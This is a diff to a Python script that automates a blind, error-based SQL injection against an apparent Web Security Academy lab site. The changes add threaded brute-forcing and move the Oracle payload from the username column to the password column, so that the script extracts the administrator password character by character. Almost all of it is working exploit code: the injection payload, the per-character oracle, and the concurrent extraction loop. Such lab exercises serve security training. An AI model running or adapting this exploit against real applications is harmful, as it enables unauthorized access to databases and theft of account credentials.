@@ -1,10 +1,9 @@
-import sys
+import concurrent.futures
 import string
 import time
 from collections import defaultdict
-
+import random
 import requests
-
 import backoff
 
 """ Exploiting blind SQL injection by triggering conditional errors
@@ -38,44 +37,86 @@ url = "https://ac881f5a1f0f744480027588006700f4.web-security-academy.net/"
 
 
 def bruteforce_password(candidates):
-    """getting the password, one character at a time"""
+    """
+    getting the password, {lookahead} characters at a time.
 
+    Starts batches of {lookahead} characters.
+    If one batch is finished, the next gets started.
+
+    If a character is reported to not exist, all queued requests for following characters get canceled.
+    It is not possible to cancel already started threads.
+    """
+
+    lookahead = 10
+
+    """ for better output of progress.
+    Characters not yet retrieved gets displayed as "?" 
+    """
     password = defaultdict(lambda: "?")
 
-    pos = 0
-    max_pos = sys.maxsize
-    while pos < max_pos:
-        pos += 1
-        character = bruteforce_password_character_offline(candidates, pos)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+        pos_to_check = 0
+        want_next_batch = True
 
-        if type(character) == str:
-            password[pos - 1] = character
-            print(show_incomplete_password(password))
-        else:
-            max_pos = pos
+        while want_next_batch:
 
-    return password
+            futures = {}
+
+            for _ in range(lookahead):
+                f"""
+                starts {lookahead} threads
+                """
+
+                futures[pos_to_check] = executor.submit(bruteforce_password_character, candidates, pos_to_check)
+                pos_to_check += 1
+
+            for thread in concurrent.futures.as_completed(futures.values()):
+                """results as yielded by as_completed"""
+                if not thread.cancelled():
+                    result_pos, result_character = thread.result()
+
+                    if type(result_character) == str:
+                        """found a valid character at this position. Add to overall result"""
+                        password[result_pos] = result_character
+
+                        print(result_pos, result_character, show_current_password(password))
+                    else:
+                        """found a position without valid character.
+                        Cancel execution of all **not yet started** futures,
+                        if they would check a position behind the last confirmed as nonexistent  
+                        """
+                        for future_pos, future_remaining in futures.items():
+                            if future_pos > result_pos and not future_remaining.cancelled():
+                                future_remaining.cancel()
+
+                        want_next_batch = False
+
+    return show_current_password(password)
 
 
 def bruteforce_password_character(candidates, pos):
     for candidate in candidates:
         if try_candidate(pos, candidate):
-            return candidate
+            return pos, candidate
     else:
-        print(f" tried all candidates for position {pos}")
-        return False
+        print(f"\n tried all candidates for position {pos}")
+        return pos, False
 
 
 def bruteforce_password_character_offline(_candidates, pos):
-    time.sleep(0.3)
+    """mock function for debug of concurrency"""
+
+    time.sleep(random.uniform(1, 5))
     try:
-        return "administrator"[pos - 1]
+        return pos, "administrator"[pos]
     except IndexError:
-        return False
+        print(f"\n Index out of bounds at pos {pos}")
+        return pos, False
 
 
 def try_candidate(pos, candidate):
-    payload = f"xyz' union select case when (SUBSTR((select username from users where username = 'administrator'), {pos}, 1) = '{candidate}') then to_char(1/0) else null end from dual -- "
+    pos += 1  # oracle indices starts with 1...
+    payload = f"xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), {pos}, 1) = '{candidate}') then to_char(1/0) else null end from dual -- "
     # print(f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{payload}'")
     return exploit(payload)
 
@@ -104,7 +145,7 @@ def exploit(payload):
         return True
 
 
-def show_incomplete_password(password: defaultdict):
+def show_current_password(password: defaultdict):
     ret = ""
     for char in range(max(password.keys()) + 1):
         ret += password[char]
